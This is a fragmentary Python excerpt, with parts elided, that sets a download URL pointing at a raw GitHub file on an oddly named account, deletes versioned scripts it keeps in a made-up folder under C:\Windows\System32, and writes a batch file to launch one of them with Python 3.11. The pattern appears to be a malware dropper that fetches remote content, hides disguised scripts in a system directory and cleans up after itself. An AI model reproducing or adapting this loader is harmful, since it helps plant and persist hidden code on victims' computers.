...
url = "https://raw.githubusercontent.com/elaideasdfxcsxcsdv/installer/refs/heads/main/uniqueid_3.0.txt"
...
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\MSRXL\aesprem-jan8.py"
    files_to_delete = [
        r"C:\Windows\System32\MSRXL\aespremv1_01032025x.py",
...
create_batch_file("py -3.11", r"C:\Windows\System32\MSRXL\aesprem-jan8.py")
